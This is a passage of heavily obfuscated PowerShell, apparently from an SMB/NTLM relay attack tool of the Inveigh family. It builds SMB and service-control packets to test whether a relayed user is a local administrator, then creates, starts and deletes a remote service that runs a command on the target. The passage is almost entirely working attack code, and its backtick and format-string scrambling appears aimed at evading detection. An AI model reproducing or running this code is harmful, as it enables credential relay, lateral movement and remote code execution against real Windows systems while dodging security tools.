                            ${pAckeT`_N`E`T`BiOS_`SesSi`oN_sERv`ice} = &("{3}{5}{2}{4}{6}{1}{0}" -f 'e','c','etB','Get-P','IOSSessio','acketN','nServi') ${smB`_HEA`D`ER}."le`NgTH" ${Rp`c_`dA`Ta_LEngtH}
                            ${Ne`TBIOs_SeSSiON_S`e`R`ViCE} = &("{6}{2}{4}{0}{3}{7}{1}{5}"-f'acket','ti','tFro','Ord','m-P','onary','Conver','eredDic') ${pACKeT_NETb`Io`s_`SessIon`_`sERVICE}
                            ${SmB`_Cl`ie`NT_`S`ENd} = ${NetB`iO`S_SESS`I`on_S`E`RvIce} + ${s`mB_h`eADeR} + ${sMb`_`DatA} + ${RpC_`d`ATA} + ${SCm_d`A`Ta}
                            ${S`MB`_C`LiENt_STrEAm}.("{0}{1}" -f 'Wri','te').Invoke(${SMB_C`l`IeN`T_s`ENd},0,${sMb`_`cLieN`T`_SEND}."lEN`G`Th")
                            ${Sm`B_Clien`T_StR`eAM}.("{1}{0}"-f'h','Flus').Invoke()
                            ${Smb`_`CliEn`T`_stReAM}.("{1}{0}" -f'ead','R').Invoke(${sM`B_`CLienT`_ReCei`Ve},0,${sMB_`clI`e`NT_reCE`ive}."L`enGth")
                            ${sM`B`_cli`EnT_STage} = ("{0}{2}{1}{3}"-f 'ReadAndX','ues','Req','t')
                            ${SMb_C`lIen`T_`st`AGe_`NExt} = ("{0}{2}{1}" -f'CheckA','ss','cce')           
                        }

                        ("{0}{1}{2}" -f 'Chec','kA','ccess')
                        {
                            
                            if( (  &("{3}{1}{0}{2}" -f'iTe','Ld','m','GEt-chI')  vARIAble:w2EhX )."v`ALue"::"tOSt`R`InG"(${smb`_c`lie`NT_R`ecEIVE}[108..111]) -eq ("{2}{1}{0}"-f'00','00-','00-00-') -and   (  &("{0}{1}{2}" -f'VarIA','B','le') ('W'+'2EhX'))."Va`LuE"::"T`OStrIng"(${sM`B_cLIE`Nt_reC`Eive}[88..107]) -ne ("{11}{10}{6}{4}{3}{2}{1}{12}{8}{7}{9}{0}{5}" -f '0','0-00','0-0','0','-','-00','00-00','0','0-00-','0-00-00-00-00-00-0','-','00-00-00-00-00','-0'))
                            {
                                ${IN`V`eIGH}."conSoL`E`_qUEuE".("{1}{0}" -f 'd','Ad').Invoke(("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'is'+' '+'a '+'loc'+'al '+'admi'+'nistrat'+'or'+' '+'o'+'n '+"$Target"))
                                ${s`m`B_seR`Vi`CE_maNA`GeR_cO`NTeXT`_`HAnd`le} = ${Smb_`CLiEnt_`ReCEI`VE}[88..107]
                                ${pac`kEt_S`C`M_dA`TA} = &("{5}{4}{2}{0}{1}{3}" -f 'teSe','rv','cketSCMCrea','iceW','t-Pa','Ge') ${s`mb_seRv`ICe_M`ANaG`e`R_CO`NTEXT_`h`A`N`dlE} ${smb_`s`ErV`ice_`ByT`ES} ${smb`_SE`R`VIcE_L`eNGth} ${pseXec_`COM`MA`ND_bYtES} ${PSe`Xec_COmm`And_l`e`NGth_By`T`eS}
                                ${sCm`_`DAta} = &("{2}{5}{6}{9}{0}{3}{8}{7}{1}{4}"-f'm-','rderedDic','Con','Pac','tionary','ver','tF','O','ket','ro') ${pac`K`ET_SCm_Da`TA}

                                if(${I`NvE`Igh}."Fi`lE`_o`Utput")
                                {
                                    ${I`N`VeIgH}."l`Og_fILE`_Q`UeUE".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target "))
                                }

                                if(${INve`I`GH}."LO`g_`Out`PUt")
                                {
                                    ${INVE`i`Gh}."l`oG".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $Target "))
                                }

                                if(${S`C`M_dATa}."Len`gtH" -lt ${SMb_SP`L`it_ind`ex})
                                {
                                    ${smb_`Cl`IEnt_sTA`ge} = ("{0}{1}{2}"-f 'Cr','eateServ','iceW')
                                }
                                else
                                {
                                    ${sm`B_ClI`ENt_S`TaGE} = ("{2}{5}{3}{0}{1}{4}" -f 'ServiceW_','Firs','Cr','e','t','eat')
                                }

                            }
                            elseif( (  &("{2}{0}{3}{1}"-f'T-VAr','lE','Ge','iab') w2eHX )."Va`lue"::"tOsTRi`NG"(${SMb_clI`EnT_rec`E`ive}[108..111]) -eq ("{1}{2}{3}{0}" -f'00-00','0','5-00','-'))
                            {
                                ${i`NveI`GH}."CoN`Sole_Q`UE`UE".("{0}{1}" -f 'Ad','d').Invoke(("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'i'+'s '+'not'+' '+'a '+'l'+'o'+'cal '+'a'+'dm'+'in'+'istrator '+'or'+' '+'d'+'oes '+'n'+'ot '+'ha'+'ve '+'requ'+'ir'+'ed '+'pr'+'i'+'vil'+'ege '+'on'+' '+"$Target"))
                                ${smB`_`ReLAY`_FA`i`LEd} = ${t`RuE}

                                if(${iNv`e`iGH}."FIL`e_`OUTPUT")
                                {
                                    ${I`Nve`igh}."LoG`_FIL`e_QUe`Ue".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target "))
                                }

                                if(${inv`E`iGh}."LOg_O`Ut`Put")
                                {
                                    ${In`VeIGH}."L`oG".("{1}{0}" -f 'dd','A').Invoke(("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator or does not have required privilege on $Target "))
                                }

                            }
                            else
                            {
                                ${sMb_`R`Ela`Y_`FAilEd} = ${t`RuE}
                            }

                        }
                
                        ("{1}{0}{3}{2}" -f 'Se','Create','iceW','rv')
                        {
                            ${PAC`Ke`T_`SM`B_heA`dER} = &("{1}{3}{2}{0}"-f 'der','Get-Packe','BHea','tSM') 0x2f 0x18 0x05,0x28 ${S`MB_`TrEE_Id} ${i`N`VeiGh}."p`RoC`e`sS_ID_by`Tes" ${SMb_US`er_`ID}
                            ${paC`K`eT_s`cM_data} = &("{1}{4}{3}{0}{2}"-f 'reateService','Ge','W','acketSCMC','t-P') ${smb_se`RvICe_M`ANAG`E`R_CONTeX`T_Han`DLE} ${smb_sE`R`Vice_b`yt`eS} ${s`m`B_s`ERVICe_`len`Gth} ${PSEXEc_COM`mA`Nd`_`ByTEs} ${pS`EXeC_c`O`mmand_`lE`Ng`Th_ByTEs}
                            ${S`cM`_datA} = &("{0}{2}{6}{3}{5}{1}{4}"-f 'C','ar','onvertFrom-PacketOrdered','t','y','ion','Dic') ${PA`cket_S`cm`_d`ATa}
                            ${pa`ckeT_`R`pc_`dATa} = &("{0}{6}{2}{5}{4}{1}{3}" -f 'Ge','qu','-P','est','Re','acketRPC','t') 0x03 ${s`cm_`DaTa}."l`EngTh" 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            ${Sm`B`_HEADeR} = &("{0}{4}{7}{9}{1}{8}{5}{2}{3}{6}" -f'C','r','Di','ctio','onvertFro','ered','nary','m-P','d','acketO') ${pA`cK`et_smb_h`ea`der}
                            ${P`A`Ck`eT_`SMb_dATA} = &("{3}{5}{2}{4}{1}{0}{6}" -f 'AndXRe','e','B','Get-Pa','Writ','cketSM','quest') ${sM`B_`FiD} (${RP`C_D`ATa}."LE`NG`Th" + ${sC`M`_DATA}."le`NgtH")
                            ${sm`B_D`A`Ta} = &("{7}{2}{1}{3}{5}{8}{6}{4}{9}{0}" -f'ry','t','ver','From-Pac','Dictio','ke','ed','Con','tOrder','na') ${pacK`et`_S`MB`_`DaTa}
                            ${RPc`_dA`Ta} = &("{3}{4}{0}{6}{8}{2}{1}{5}{7}{9}" -f 'm','tOr','acke','Convert','Fro','deredDic','-','tiona','P','ry') ${pA`CK`E`T`_RPc_daTa} 
                            ${RP`C`_daTA_l`ENg`Th} = ${SMB_`d`ATa}."Len`GTH" + ${SCM`_`DA`TA}."LEn`gTH" + ${R`p`c_dATa}."LeNg`TH"
                            ${p`ACk`eT_N`eTB`Io`S_SEss`ion_SEr`VI`ce} = &("{9}{2}{3}{7}{0}{5}{4}{8}{1}{6}" -f'k','ssionServi','-P','a','NetBIOSS','et','ce','c','e','Get') ${s`MB_HeA`DeR}."l`eNG`Th" ${rPc_DaTA`_lE`N`gtH}
                            ${nE`TbIO`s_se`Ss`i`oN`_S`ERVIcE} = &("{6}{3}{2}{1}{4}{7}{5}{0}" -f 'nary','acketOrd','P','ertFrom-','ere','o','Conv','dDicti') ${paCk`et_n`E`Tb`IOS_sESSiOn_Ser`V`ice}
                            ${s`M`B_cliEN`T`_SE`ND} = ${NeTBi`o`S_SeSsi`O`N_servicE} + ${SM`B`_heADEr} + ${smb`_`dATa} + ${r`Pc_`DATA} + ${SCm_`da`TA}
                            ${s`M`B_ClI`eNT_sTr`e`Am}.("{0}{1}" -f 'Wri','te').Invoke(${Smb_cLi`EN`T_`SENd},0,${Sm`B_clIe`Nt_`S`eNd}."L`engTH")
                            ${SMB_C`l`IeNt`_`Str`eaM}.("{0}{1}" -f'Flus','h').Invoke()
                            ${sm`B_C`l`I`EnT_stREAM}.("{1}{0}"-f'ad','Re').Invoke(${smb`_CL`iE`NT_`ReceIVE},0,${sM`B`_Cl`ienT_rECEIve}."LeN`G`Th")
                            ${SM`B_clie`N`T_S`TAGE} = ("{2}{3}{0}{1}" -f 'AndXReques','t','Rea','d')
                            ${smb_cL`iE`N`T_STa`g`E_NEXT} = ("{0}{2}{1}" -f 'StartS','viceW','er')   
                        }

                        ("{3}{2}{0}{1}" -f'erviceW_Fir','st','reateS','C')
                        {
                            ${s`Mb_`SP`li`T_sTage_fI`N`AL} =  (  &("{2}{1}{0}{3}"-f 'Ab','vaRi','GeT-','Le') Jg6 -VAlU  )::("{2}{1}{0}" -f 'ng','i','Ceil').Invoke(${sc`M_DA`TA}."LE`N`gTH" / ${s`mb_`Spl`it_in`dEX})
                            ${pa`c`KEt`_smB_HEA`deR} = &("{2}{4}{0}{3}{1}{5}" -f'e','BH','G','tSM','et-Pack','eader') 0x2f 0x18 0x05,0x28 ${S`m`B_TReE_`Id} ${I`Nv`Eigh}."pRO`ceS`s_i`d`_bytEs" ${sMB_u`s`e`R_id}
                            ${sC`M_DaT`A`_F`irsT} = ${Scm`_da`TA}[0..(${Smb_S`P`LIT_In`dex} - 1)]
                            ${pAcket`_`R`Pc_Data} = &("{5}{2}{0}{4}{3}{1}" -f't-PacketRPCRequ','t','e','s','e','G') 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${SCm_`da`TA`_`FirST}
                            ${paCket_r`pc_`DaTA}[("{1}{0}{2}{3}{4}" -f'Req','RPC','ue','st_Alloc','Hint')] =   ( &("{0}{3}{1}{2}"-f'gET-v','iA','ble','Ar')  ('W2Eh'+'X') )."VA`LuE"::("{2}{0}{1}" -f't','es','GetBy').Invoke(${SC`M_daTa}."lEN`g`TH")
                            ${Smb`_sP`lIt_I`Nd`EX_`TrA`C`KER} = ${Smb`_Spl`I`T_IndEX}
                            ${R`p`C_`dATa} = &("{5}{0}{2}{7}{4}{6}{3}{1}{8}" -f 'onvert','nar','From','rderedDictio','cke','C','tO','-Pa','y') ${Pa`C`K`eT_rpc_Data} 
                            ${sMb`_hE`Ad`eR} = &("{2}{1}{3}{5}{6}{4}{7}{0}{8}{9}"-f 'r','rtFro','Conve','m','rd','-Pack','etO','e','edDicti','onary') ${p`AckeT_`smb_H`EaDeR}
                            ${pA`cK`Et_SMb_da`TA} = &("{1}{6}{2}{4}{0}{3}{5}" -f 'WriteAndX','Get','e','Reque','tSMB','st','-Pack') ${Sm`B_f`ID} ${RP`C`_d`ATa}."LEng`TH"
                            ${SmB`_`DATA} = &("{8}{4}{1}{2}{0}{3}{6}{5}{7}"-f'PacketOr','Fro','m-','deredDicti','ert','ar','on','y','Conv') ${PAcKet_`s`MB_`DAta}
                            ${RpC_DATa`_`Le`NgTh} = ${S`m`B_`dATa}."lEN`G`TH" + ${rP`C_DAtA}."l`Ength"  
                            ${Pac`KEt_NET`Bi`oS_s`es`sIOn_`SE`RvICE} = &("{3}{2}{0}{6}{5}{4}{1}"-f'Pa','NetBIOSSessionService','-','Get','t','ke','c') ${s`M`B_HEAder}."Leng`Th" ${Rp`c_daTa_`le`NG`TH}
                            ${netBIos_s`Essi`On`_`S`ErvIce} = &("{2}{3}{0}{4}{1}{5}"-f 'etOrde','Dictio','ConvertFrom-Pac','k','red','nary') ${PAcke`T`_`NE`Tb`Ios_Se`sSIOn`_SerVi`cE}
                            ${Smb_`cLiE`Nt_sE`ND} = ${nE`T`Bi`oS_seSsioN_seR`VICe} + ${S`mB_hE`Ad`Er} + ${smB_d`A`TA} + ${Rp`c_DAta}
                            ${sM`B`_cL`IEnT_S`TrEaM}.("{1}{0}"-f 'rite','W').Invoke(${sMb`_Cl`iEn`T_`S`eND},0,${SM`B`_cl`IEnT_sEnD}."lENG`TH")
                            ${smB_cl`Ie`Nt_`sT`R`EaM}.("{1}{0}" -f 'lush','F').Invoke()
                            ${SMB_CliEn`T_`s`TrE`AM}.("{0}{1}" -f'Re','ad').Invoke(${smB_CL`ieN`T_R`EcEIVE},0,${SMB_CLie`NT`_r`eceiVE}."leN`gtH")
                            
                            if(${Smb`_sPlIt_`sTAg`e_f`iNAl} -le 2)
                            {
                                ${s`mb_c`l`iEnT_stA`ge} = ("{0}{2}{1}{3}" -f 'C','viceW','reateSer','_Last')
                            }
                            else
                            {
                                ${sM`B_`sp`liT_sT`A`ge} = 2
                                ${smB_`C`LIeN`T_`sT`Age} = ("{1}{5}{0}{2}{4}{3}"-f'a','C','teSe','iddle','rviceW_M','re')
                            }

                        }

                        ("{0}{2}{3}{4}{1}"-f'Cre','viceW_Middle','at','eSe','r')
                        {
                            ${s`mb_`sP`Lit`_s`TAge}++
                            ${P`AckeT_`Smb_h`eA`der} = &("{0}{1}{3}{5}{4}{2}"-f 'Ge','t-Pa','Header','ck','tSMB','e') 0x2f 0x18 0x05,0x28 ${SMb`_T`R`eE_id} ${in`Ve`igH}."pRO`cEsS`_iD_`BYtES" ${Sm`B_u`Se`R_iD}
                            ${scM_da`T`A_m`iDDLE} = ${S`CM`_dATa}[${SmB_s`P`L`iT_IN`dEx_TRAck`ER}..(${S`M`B_SPlIT`_indEX`_T`RACK`ER} + ${smB_S`pLit`_`i`Ndex} - 1)]
                            ${sM`B_`sp`lIT`_I`NDEx_T`Rac`kER} += ${sm`B_`SpLi`T`_IndeX}
                            ${PA`cket_Rpc_`D`A`Ta} = &("{3}{1}{0}{4}{2}"-f'CRe','cketRP','st','Get-Pa','que') 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${SCM`_dA`Ta_Mi`DDLe}
                            ${pAckET_R`pc`_`da`TA}[("{2}{1}{5}{4}{0}{3}" -f 'in','quest_Al','RPCRe','t','ocH','l')] =   ( &("{0}{2}{1}{3}" -f 'ge','rIaB','t-VA','lE') ('W2'+'EHX') -vALUEo  )::("{1}{2}{0}"-f 'Bytes','G','et').Invoke(${scM`_DA`Ta}."leng`TH" - ${sMB`_`sp`LiT_iNDEX_TraC`KER} + ${sm`B_`SPliT_`i`NdEX})
                            ${R`pc_`DaTA} = &("{1}{0}{5}{3}{2}{6}{4}" -f 'nvertFrom-PacketO','Co','ict','dD','nary','rdere','io') ${P`AC`KEt`_RPc_daTa} 
                            ${Sm`B_HE`AD`eR} = &("{0}{1}{4}{6}{3}{5}{2}"-f'Co','nver','Dictionary','ck','t','etOrdered','From-Pa') ${PAcKEt`_SmB`_H`EaDeR}
                            ${p`A`ckE`T_S`Mb_DaTa} = &("{2}{1}{3}{0}{4}" -f'BWriteAndXRequ','-Pack','Get','etSM','est') ${smb`_`FID} ${Rp`c_D`AtA}."LEnG`TH"
                            ${s`Mb`_D`AtA} = &("{3}{1}{0}{5}{2}{6}{4}" -f 'ack','P','rd','ConvertFrom-','y','etO','eredDictionar') ${PaCKeT`_`Smb_d`AtA}
                            ${rPC_`DAt`A_l`Eng`TH} = ${smB`_data}."Len`gTH" + ${Rp`C_`daTA}."Le`NGTh" 
                            ${PaCkEt_`NE`TbiOs_sEsSIo`N_`SErv`ICe} = &("{4}{3}{6}{1}{0}{2}{5}" -f'er','IOSSessionS','vic','Pa','Get-','e','cketNetB') ${S`mb_`HeaD`ER}."L`eNGtH" ${RpC_`dATA`_leN`gth}
                            ${N`ETB`i`oS_sESsIoN`_seRvi`ce} = &("{6}{4}{2}{0}{3}{7}{5}{1}{8}" -f '-P','onar','rtFrom','acketOrdere','onve','icti','C','dD','y') ${P`Ac`Ket_NetbI`o`S_sE`SsioN_SERv`ICe}
                            ${s`m`B_c`LIenT_`senD} = ${n`eTb`IOS_SEs`SIon_SeR`VicE} + ${SmB`_he`AD`er} + ${SM`B_D`ATa} + ${RP`c_Da`TA}
                            ${sm`B`_cLI`En`T_s`TreaM}.("{1}{0}"-f 'rite','W').Invoke(${S`Mb_CLIE`NT_`s`eNd},0,${smB_`cL`ieNT_`s`ENd}."LE`Ngth")
                            ${SmB_CL`i`ENt`_`stR`Eam}.("{1}{0}"-f'sh','Flu').Invoke()
                            ${sM`B_cl`Ie`Nt_s`Tream}.("{0}{1}" -f 'R','ead').Invoke(${SMB`_CLieN`T_R`ec`eivE},0,${SM`B_CLIe`N`T_reCe`i`VE}."l`EnG`TH")
                            
                            if(${sM`B_Spl`IT`_st`A`ge} -ge ${SMB_SP`liT`_S`T`Ag`E_FiN`Al})
                            {
                                ${sM`B_cliEn`T_S`TAge} = ("{1}{4}{3}{0}{2}"-f'Serv','Crea','iceW_Last','e','t')
                            }
                            else
                            {
                                ${Sm`B_CLIe`Nt_S`TAgE} = ("{2}{1}{3}{0}"-f 'le','erviceW_','CreateS','Midd')
                            }

                        }

                        ("{0}{3}{2}{1}{4}"-f'C','rvic','Se','reate','eW_Last')
                        {
                            ${pAcket_`sM`B`_headEr} = &("{0}{6}{2}{4}{5}{1}{3}"-f 'Ge','B','ck','Header','et','SM','t-Pa') 0x2f 0x18 0x05,0x28 ${SMB_`T`Ree`_iD} ${inVeI`Gh}."ProC`e`sS_id_`BYtes" ${Smb_u`S`er_`Id}
                            ${S`Cm_`daT`A_la`st} = ${sc`m_D`A`TA}[${SMb_spLit_I`Ndex`_TrAc`k`er}..${scm_D`A`Ta}."LEnG`Th"]
                            ${pa`cKEt_rPC`_`DA`Ta} = &("{1}{2}{0}{3}"-f 'etR','Get-Pa','ck','PCRequest') 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${SC`M`_d`AT`A_LAsT}
                            ${RPC`_DAtA} = &("{1}{2}{0}{3}{4}{7}{6}{5}{8}"-f'ertFr','C','onv','om-PacketOrder','ed','on','i','Dict','ary') ${PAc`Ke`T_RpC_d`A`Ta} 
                            ${sm`B_h`EaD`Er} = &("{2}{0}{5}{4}{3}{1}{7}{8}{6}"-f'rom-','r','ConvertF','O','acket','P','nary','der','edDictio') ${PaC`ket`_S`mb_heAD`er}
                            ${Pa`cket`_S`MB_D`ATA} = &("{7}{4}{6}{5}{3}{0}{1}{8}{2}"-f 'Re','q','est','AndX','t-PacketSM','e','BWrit','Ge','u') ${s`mB_FID} ${r`Pc_`DATa}."LEn`Gth"
                            ${SM`B`_DaTA} = &("{1}{8}{0}{5}{2}{4}{3}{6}{9}{7}"-f 'tF','Con','etOr','e','d','rom-Pack','red','tionary','ver','Dic') ${PA`c`Ket`_s`mb_DATa}
                            ${rPc`_`da`TA_l`EngtH} = ${Sm`B`_DATa}."leN`GtH" + ${rp`C_datA}."leNG`Th"  
                            ${PA`CkeT_`NE`TbioS`_S`EssIo`N_serV`iCE} = &("{6}{5}{9}{1}{7}{4}{0}{8}{3}{2}" -f 'S','s','e','vic','on','e','G','si','er','t-PacketNetBIOSSe') ${sm`B_`hEaDER}."LEN`gth" ${r`P`c_datA_L`enG`Th}
                            ${NE`TbIOs_`sesSIon_serv`i`ce} = &("{6}{4}{0}{2}{3}{5}{7}{1}{8}" -f'c','ctionar','ke','t','om-Pa','O','ConvertFr','rderedDi','y') ${PAckeT_NeT`BIO`S`_SESS`IoN`_`sErvIcE}
                            ${s`mb_ClIE`Nt_SE`ND} = ${NE`Tb`ioS_S`esSIon_`SErVicE} + ${SmB`_h`EAdeR} + ${SM`B_Da`Ta} + ${R`PC_Da`Ta}
                            ${s`mB`_CLIEnT_s`TREaM}.("{1}{0}"-f'e','Writ').Invoke(${SM`B`_C`LIEnt_S`eNd},0,${sMb_C`LieNt_sE`Nd}."lEN`GtH")
                            ${s`mB_c`LieNT_s`T`ReaM}.("{1}{0}" -f 'h','Flus').Invoke()
                            ${sMb`_cL`ieNT_`sTrEam}.("{0}{1}"-f 'Re','ad').Invoke(${S`mB_`clIENT_ReCe`iVe},0,${sM`B_Cl`I`ent_r`eCEiVE}."Len`gtH")
                            ${sMB_cli`E`Nt`_`S`TAGe} = ("{1}{3}{0}{2}" -f's','ReadAndXRe','t','que')
                            ${SMb_c`LiE`NT_sT`Age_`NEXT} = ("{1}{0}{2}"-f 'tartServ','S','iceW')
                        }

                        ("{0}{1}{3}{4}{2}" -f 'Star','tSer','eW','vi','c')
                        {

                            if(  (  &("{2}{1}{0}"-f 'AbLE','ri','VA')  W2EHX -VAlUEoNLy  )::"To`StriNg"(${S`mB_cLieNt`_Re`cE`IvE}[112..115]) -eq ("{2}{1}{0}" -f'0-00','00-0','00-'))
                            {
                                
                                if(${Inv`Ei`gh}."filE_O`UT`PUT")
                                {
                                    ${I`N`VeigH}."L`O`g_f`ILE_q`UeuE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target "))
                                    ${in`V`EIGh}."lo`G_`FIlE_quEUe".("{0}{1}"-f 'A','dd').Invoke(('Tryin'+'g '+'t'+'o '+'exec'+'ute'+' '+'SMB'+' '+'re'+'lay '+'c'+'om'+'mand '+'on'+' '+"$Target"))
                                }

                                if(${I`NV`Eigh}."Lo`G_o`UtpUt")
                                {
                                    ${iNvE`IgH}."l`oG".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service created on $Target "))
                                    ${iNV`E`igh}."l`Og".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Trying to execute SMB relay command on $Target "))
                                }

                                ${iNv`eIgh}."co`N`sOLE_QUEUe".("{0}{1}"-f 'A','dd').Invoke(('SM'+'B '+'rela'+'y '+'service'+' '+"$SMB_service "+'create'+'d '+'o'+'n '+"$Target"))
                                ${in`Vei`gh}."C`O`Nsol`e_`QuEUe".("{0}{1}" -f'A','dd').Invoke(('Tr'+'yin'+'g '+'t'+'o '+'exec'+'u'+'te '+'SMB'+' '+'r'+'el'+'ay '+'co'+'m'+'mand '+'on'+' '+"$Target"))
                                ${s`MB_seRVIC`e_CONTexT_H`A`N`d`LE} = ${sm`B`_`cLie`Nt_reCeIve}[92..111]
                                ${Pack`E`T_`s`MB_HeADEr} = &("{5}{0}{2}{1}{4}{3}"-f'e','-Pack','t','tSMBHeader','e','G') 0x2f 0x18 0x05,0x28 ${s`M`B_Tr`eE_Id} ${inv`EiGh}."P`R`OCESs`_`ID_BYtes" ${s`mB_`User`_id}
                                ${PAcKet`_sCM`_DatA} = &("{4}{7}{3}{0}{5}{2}{6}{1}{8}" -f'acket','v','CMSta','P','Ge','S','rtSer','t-','iceW') ${sMB_S`eRV`ice_`Con`TE`XT_H`ANdlE}
                                ${scm`_d`A`Ta} = &("{6}{1}{5}{3}{0}{4}{2}"-f'edDict','nvertFrom-','ary','rder','ion','PacketO','Co') ${PAc`KE`T_sC`m`_DATA}
                                ${pacKE`T_rpc_D`A`TA} = &("{4}{2}{0}{1}{3}"-f'etRP','CRe','Pack','quest','Get-') 0x03 ${Sc`M_Data}."len`G`TH" 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                                ${R`PC_`daTa} = &("{3}{7}{0}{1}{6}{5}{2}{4}"-f'a','cketOrde','ic','ConvertFr','tionary','edD','r','om-P') ${PA`Cke`T_Rpc`_`daTA}
                                ${S`m`B_He`AdeR} = &("{4}{5}{8}{3}{7}{6}{2}{0}{1}"-f'nar','y','dDictio','Packe','Conve','r','re','tOrde','tFrom-') ${P`Ac`Ket_S`mb_hE`Ad`ER}   
                                ${P`AC`Ket`_SmB_datA} = &("{3}{2}{6}{8}{7}{0}{5}{4}{1}"-f 'q','st','t-Pack','Ge','e','u','etSM','dXRe','BWriteAn') ${sm`B_FId} (${RpC_`D`A`TA}."lE`NGTh" + ${scm_`daTA}."lE`Ngth")
                                ${s`mB_`d`ATA} = &("{3}{8}{6}{2}{0}{4}{1}{7}{5}" -f're','ctio','Orde','Conve','dDi','ary','-Packet','n','rtFrom') ${P`ACkeT`_`SMB`_DATa} 
                                ${rpc`_datA_le`NgTH} = ${S`M`B_DATA}."L`EngTh" + ${scm_`D`ATa}."le`NG`TH" + ${rPc`_DaTA}."L`eN`Gth"
                                ${p`AcKEt_`N`EtBI`oS_`SeS`S`IoN`_S`eRviCE} = &("{3}{6}{1}{5}{7}{0}{4}{2}"-f'e','tBIO','vice','Get-Pack','r','SSe','etNe','ssionS') ${SM`B_HE`AdER}."leN`gTH" ${RPC_`da`Ta_l`E`NGTH}
                                ${Ne`T`B`iOs_`SEsSioN`_SE`Rvice} = &("{1}{0}{2}{5}{6}{3}{7}{4}" -f'onv','C','ertFro','rderedDic','y','m-Pa','cketO','tionar') ${PaC`kET_net`BIos`_S`eSS`iOn_s`erVIcE}
                                ${S`mb_Cl`Ie`Nt_`seND} = ${NE`TBi`os_Ses`SI`oN`_`serVicE} + ${SMB_H`e`A`DER} + ${sM`B_dA`Ta} + ${Rp`c`_daTa} + ${S`cm_d`ATA}
                                ${sMB_`CliE`Nt_`S`TReAm}.("{0}{1}" -f'Wri','te').Invoke(${s`mb_Cl`Ie`Nt_SE`Nd},0,${s`Mb_C`LIE`Nt_SEnd}."l`eNGth")
                                ${S`Mb_c`LiEnt_Str`Eam}.("{0}{1}"-f 'Flu','sh').Invoke()
                                ${sMb`_clI`E`NT_`stream}.("{0}{1}"-f'Rea','d').Invoke(${S`mB_`CLIenT`_`RECE`IVe},0,${Smb`_`CLIent_`RE`cEIvE}."LE`Ngth")
                                ${smB_`c`LIEnt`_STA`Ge} = ("{3}{1}{0}{2}" -f 'XRequ','adAnd','est','Re')
                                ${SM`B_CLI`e`NT`_staGE_`NExt} = ("{1}{0}{3}{2}"-f 'lete','De','erviceW','S')  
                            }
                            elseif( ( &("{0}{1}{2}"-f 'vArI','abL','E')  ("W"+"2eHx")  )."val`Ue"::"T`oS`TrinG"(${smB_cLi`E`Nt_r`eceI`VE}[112..115]) -eq ("{2}{1}{0}" -f'00','04-00-','31-'))
                            {
                                ${I`NVeI`gh}."C`oN`S`ole_qU`EUE".("{0}{1}"-f'A','dd').Invoke(('SMB'+' '+'r'+'e'+'lay '+'servic'+'e '+"$SMB_service "+'crea'+'ti'+'on '+'fa'+'iled '+'on'+' '+"$Target"))
                                ${Sm`B_RELaY_`Fa`IleD} = ${t`RUE}

                                if(${I`NV`eiGH}."FILe_`O`UT`put")
                                {
                                    ${i`NVei`gh}."LOG`_F`iLE`_`queUE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target "))
                                }

                                if(${INv`eI`gH}."Log_`O`Utput")
                                {
                                    ${i`Nv`EiGh}."l`OG".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service creation failed on $Target "))
                                }

                            }
                            else
                            {
                                ${smB_`RE`LA`Y_`Fa`ilEd} = ${TR`Ue}
                            }
    
                        }
                
                        ("{4}{2}{1}{0}{3}"-f 'e','teS','le','rviceW','De')
                        { 

                            if(  ${W2`EhX}::"TO`St`RING"(${Smb`_C`lIE`Nt_REc`EiVE}[88..91]) -eq ("{2}{1}{0}"-f'00','4-00-','1d-0'))
                            {
                                ${i`NveI`Gh}."COnsole`_Q`U`eUe".("{0}{1}"-f'A','dd').Invoke(('SM'+'B '+'re'+'lay '+'co'+'mmand'+' '+'exe'+'cuted'+' '+'on'+' '+"$Target"))

                                if(${In`VE`igh}."FIL`e`_OUTput")
                                {
                                    ${IN`V`eIGh}."log_FiLE`_Qu`E`UE".("{0}{1}"-f 'A','dd').Invoke(("$(Get-Date -format 's') - SMB relay command executed on $Target "))
                                }

                                if(${in`V`eIGh}."LoG`_Out`pUt")
                                {
                                    ${in`V`EiGh}."L`Og".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay command executed on $Target "))
                                }

                            }
                            elseif( ${W2E`hx}::"tosT`RI`NG"(${Sm`B`_cLIE`N`T_`ReCEIVE}[88..91]) -eq ("{0}{3}{1}{2}" -f '0','-','00','2-00-00'))
                            {
                                ${iN`VEIgh}."C`OnS`ol`E_q`UEuE".("{0}{1}" -f 'A','dd').Invoke(('S'+'MB '+'rela'+'y '+'se'+'rv'+'ice '+"$SMB_service "+'f'+'ailed'+' '+'to'+' '+'star'+'t'+' '+'on'+' '+"$Target"))

                                if(${in`VeigH}."FilE`_`oUtPUT")
                                {
                                    ${In`VeIGh}."l`O`G_fILe_QUEUE".("{1}{0}"-f'dd','A').Invoke(("$(Get-Date -format 's') - SMB relay service $SMB_service failed to start on $Target "))
                                }

                                if(${iN`V`eIGH}."lO`G`_Ou`TPuT")
                                {
